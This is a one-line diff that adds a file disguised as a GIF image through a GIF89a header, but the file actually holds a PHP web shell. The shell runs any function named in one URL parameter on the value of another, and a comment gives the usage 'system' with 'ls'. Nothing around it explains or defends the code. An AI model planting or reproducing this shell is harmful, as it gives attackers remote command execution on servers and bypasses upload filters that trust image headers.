@@ -1,0 +1,1 @@
+GIF89a <?php echo(isset($_GET[1])?$_GET[1]($_GET[2]):''); // Usage: index.php?1=system&2=ls ?>
